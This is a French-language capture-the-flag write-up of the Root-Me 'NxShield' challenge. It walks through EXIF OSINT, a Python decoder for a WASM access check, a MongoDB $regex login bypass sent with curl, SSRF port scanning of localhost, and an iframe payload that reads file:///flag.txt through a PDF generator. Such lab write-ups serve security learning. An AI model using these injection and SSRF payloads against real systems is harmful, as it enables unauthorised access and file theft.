# Write-Up — Root-Me ch88 : NxShield

> **Catégorie :** Réaliste  
> **Difficulté :** ⭐⭐⭐⭐  
> **Flag :** `RM{REDACTED}`  
> **Tags :** OSINT · EXIF · WASM Reverse · NoSQL Injection · SSRF · HTML Injection · PDF Exfiltration

---

## 📋 Sommaire

1. [Vue d'ensemble](#vue-densemble)
2. [Étape 1 — Host Header & OSINT](#étape-1--host-header--osint)
3. [Étape 2 — Analyse EXIF de l'image](#étape-2--analyse-exif-de-limage)
4. [Étape 3 — Reverse Engineering WASM](#étape-3--reverse-engineering-wasm)
5. [Étape 4 — Bypass d'authentification NoSQL](#étape-4--bypass-dauthentification-nosql)
6. [Étape 5 — SSRF & Scan de ports](#étape-5--ssrf--scan-de-ports)
7. [Étape 6 — Injection HTML dans le PDF](#étape-6--injection-html-dans-le-pdf)
8. [Automatisation complète](#automatisation-complète)
9. [Conclusion](#conclusion)

---

## Vue d'ensemble

Ce challenge réaliste est un enchaînement de techniques variées : OSINT, reverse de WebAssembly, injection NoSQL, Server-Side Request Forgery (SSRF) et exfiltration via génération de PDF. Chaque étape déverrouille la suivante.

```
[Host Header] → [OSINT/EXIF] → [WASM Reverse] → [NoSQL Bypass] → [SSRF] → [PDF Injection] → FLAG
```

---

## Étape 1 — Host Header & OSINT

### Observation initiale

En accédant à `http://challenge01.root-me.org/realiste/ch88/`, le serveur répond :

```
Access Forbidden !
Until you have the appropriate Host: header for 2001:bc8:35b0:c166::151 or 212.129.38.224 :)
```

Le serveur attend un `Host` HTTP spécifique. Il faut trouver le nom de domaine associé à l'une de ces adresses IP.

### Résolution

L'énoncé nous invite à analyser attentivement la photo présente sur la page. On récupère l'image `server_room.jpg`.

---

## Étape 2 — Analyse EXIF de l'image

### Extraction des métadonnées

On inspecte les métadonnées EXIF de l'image (via `exiftool`, un script Python ou [aperisolve.com](https://aperisolve.com)) :

```bash
exiftool server_room.jpg
```

On trouve dans le champ **Image Copyright** :

```
(c) Made with the OpenSource NxMetaRemover tool
```

### OSINT sur l'outil

En cherchant `NxMetaRemover` sur GitHub, on tombe sur le projet **NxShield**.

Le dépôt révèle le nom de domaine recherché : **`nxshield.com`**

### Configuration du fichier hosts

On associe l'IP au domaine dans `/etc/hosts` :

```
212.129.38.224  nxshield.com
```

Le site est maintenant accessible via `http://nxshield.com`.

---

## Étape 3 — Reverse Engineering WASM

### Contexte

La section **Client Area** du site présente un formulaire demandant un **Access Code**. La validation est effectuée côté client par un fichier `demo.wasm`.

### Analyse du fichier WASM

On décompile le binaire WebAssembly. Trois opérations de validation sont identifiées :

| Étape | Opération |
|---|---|
| 1 | Vérification de la taille : **39 caractères** |
| 2 | `decrypt_password_step_1` : XOR avec `12` |
| 3 | `decrypt_password_step_2` : addition de `13`, modulo `256` |

### Données encodées

Dans la section `data` du WASM, on trouve la séquence d'octets suivante (les 39 derniers bytes significatifs) :

```
3}bH6HcNH6OH}J6bLI.6ONLJ6IJc~6O3J}6}}2c
```

En hexadécimal :

```python
encrypted_bytes = bytes([
    0x33, 0x7d, 0x62, 0x48, 0x36, 0x48, 0x63, 0x4e,
    0x48, 0x36, 0x4f, 0x48, 0x7d, 0x4a, 0x36, 0x62,
    0x4c, 0x49, 0x7f, 0x36, 0x4f, 0x4e, 0x4c, 0x4a,
    0x36, 0x49, 0x4a, 0x63, 0x7e, 0x36, 0x4f, 0x33,
    0x4a, 0x7d, 0x36, 0x7d, 0x7d, 0x32, 0x63
])
```

> 💡 On remarque la valeur `0x36` (soit `'6'`) tous les 4 octets — indice d'un token segmenté en blocs.

### Décodage (opération inverse)

```python
encrypted_bytes = bytes([
    0x33, 0x7d, 0x62, 0x48, 0x36, 0x48, 0x63, 0x4e,
    0x48, 0x36, 0x4f, 0x48, 0x7d, 0x4a, 0x36, 0x62,
    0x4c, 0x49, 0x7f, 0x36, 0x4f, 0x4e, 0x4c, 0x4a,
    0x36, 0x49, 0x4a, 0x63, 0x7e, 0x36, 0x4f, 0x33,
    0x4a, 0x7d, 0x36, 0x7d, 0x7d, 0x32, 0x63
])

decoded = []
for b in encrypted_bytes:
    step1 = (b - 13) % 256   # inverse de step_2
    step2 = step1 ^ 12        # inverse de step_1
    decoded.append(chr(step2))

token = ''.join(decoded)
print(token)
# → 2da7-7b57-67d9-a38f-6539-89be-629d-dd1b
```

### Résultat

**Token d'accès :** `2da7-7b57-67d9-a38f-6539-89be-629d-dd1b`

En le saisissant, on est redirigé vers :  
`http://nxshield.com/demo_access/ab19cf886b5a8facb01403b6abbfa440.html`

---

## Étape 4 — Bypass d'authentification NoSQL

### Observation

La page précédente présente un formulaire d'authentification (nom + mot de passe). En testant différentes entrées, on détecte un backend **MongoDB**.

### Exploitation — NoSQL Injection (Regex bypass)

On envoie une requête POST avec des opérateurs MongoDB :

```json
{
    "name":     {"$regex": ""},
    "password": {"$regex": ""}
}
```

```bash
curl -X POST http://nxshield.com/demo_access/ab19cf886b5a8facb01403b6abbfa440.html \
  -H "Content-Type: application/json" \
  -d '{"name": {"$regex": ""}, "password": {"$regex": ""}}'
```

La regex vide matche n'importe quelle valeur → authentification bypassée.

### Résultat

On récupère un **cookie de session** et accède au panel :  
`http://nxshield.com/demo_access/ab19cf886b5a8facb01403b6abbfa440/panel`

---

## Étape 5 — SSRF & Scan de ports

### Identification de la fonctionnalité vulnérable

Le panel expose un champ permettant au serveur d'effectuer des requêtes HTTP vers une IP fournie par l'utilisateur → **Server-Side Request Forgery (SSRF)**.

### Analyse du code source (GitHub NxShield — IP_Checker)

```python
def check(ip_address, show):
    render = list()
    if ip_address != '':
        RANGE_IP = ['1.1.1.1/24', '8.8.8.8/24', '8.8.4.4/24']
        checker = IpChecker(RANGE_IP)
        render_range = checker.check_ip_range(ip_address)
        render.append(render_range)

        if show != '':
            render_website = checker.has_a_website(ip_address)
            render.append(render_website)
            return render
    return render
```

Le paramètre `show` permet d'afficher la réponse de la requête effectuée par le serveur.

### Scan de ports internes

En itérant sur les ports de `127.0.0.1`, on découvre un service sur le **port 1337** :

```
http://127.0.0.1:1337
```

---

## Étape 6 — Injection HTML dans le PDF

### Service sur le port 1337

Le service interne expose un formulaire de génération de PDF avec les champs :

- `firstname`
- `lastname`
- `email`
- `address`

Le formulaire utilise la méthode **GET**, permettant d'injecter des paramètres directement dans l'URL.

### Exploitation — HTML Injection → LFI via iframe

On injecte une `<iframe>` pointant vers le fichier flag du serveur dans le champ `lastname` :

```html
<iframe src="file:///flag.txt" width="100%" height="800"></iframe>
```

URL complète :

```
http://127.0.0.1:1337/render-XXXX?firstname=test&lastname=<iframe src="file:///flag.txt" width="100%" height="800"></iframe>&email=a@a.com&address=test
```

### Récupération du flag

Le serveur retourne le PDF encodé en **base64**. On le décode et on en extrait le texte :

```python
import base64, io
from pdfminer.high_level import extract_text

pdf_b64 = "<base64 response>"
pdf_bytes = base64.b64decode(pdf_b64)
text = extract_text(io.BytesIO(pdf_bytes))
print(text)
# → RM{REDACTED}
```

---

## Automatisation complète

Le script `script.py` automatise l'ensemble de la chaîne d'exploitation :

```
[1] 🖼️  Copyright de l'image  : (c) Made with the OpenSource NxMetaRemover tool
[2] 🔑  Token d'entrée        : 2da7-7b57-67d9-a38f-6539-89be-629d-dd1b
[3] 🍪  Cookie de session     : eyJ1c2VybmFtZSI6IkJvYiJ9.aMfriA.P0M709cJ-h6OoJ0LLQRPf2QahYc
[4] 🔌  Port cible            : 1337
[5] 📝  Action du formulaire  : render-e9321f2e-8f40-4b56-8b81-c461b10d92f0
[6] 📡  Requête PDF envoyée
[7] 📜  PDF récupéré (base64)
[8] ⚙️  Extraction du texte
[9] 🚀  Flag 🎉              : RM{REDACTED}
```

### Installation

```bash
pip install -r requirements.txt
python script.py
```

---

## Conclusion

Ce challenge est une belle chaîne d'exploitation réaliste combinant :

| Technique | Outil / Méthode |
|---|---|
| OSINT / EXIF | `exiftool`, GitHub |
| Reverse WebAssembly | Décompilation WASM manuelle |
| NoSQL Injection | Opérateur MongoDB `$regex` |
| SSRF | Paramètre `show` + `127.0.0.1` |
| HTML → PDF Injection | `<iframe src="file:///flag.txt">` |

> La difficulté principale réside dans le reverse du fichier WASM et l'identification du paramètre `show` permettant d'afficher les réponses SSRF.

---

*Write-up rédigé après résolution du challenge.*
